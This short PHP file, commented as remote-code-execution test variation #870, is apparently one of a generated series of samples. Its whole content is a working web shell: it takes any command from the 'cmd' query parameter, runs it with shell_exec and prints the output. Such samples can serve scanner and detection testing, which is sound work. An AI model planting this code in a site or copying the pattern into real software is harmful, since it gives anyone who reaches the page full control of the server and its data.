<?php
// RCE test variation #870
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>